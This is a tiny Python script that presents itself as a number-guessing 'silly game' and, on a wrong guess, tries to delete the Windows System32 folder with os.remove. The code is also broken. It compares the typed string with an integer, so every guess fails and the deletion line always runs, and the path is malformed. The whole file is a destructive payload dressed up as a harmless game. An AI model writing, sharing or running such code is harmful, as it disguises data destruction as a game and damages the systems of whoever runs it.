import random
import os

number = random.randint(1,10)

guess = input("silly game! guess a number between 1 and 10: ")

if guess == number:
    print("well done! you survive")

else:
    os.remove("C\Windows\System32")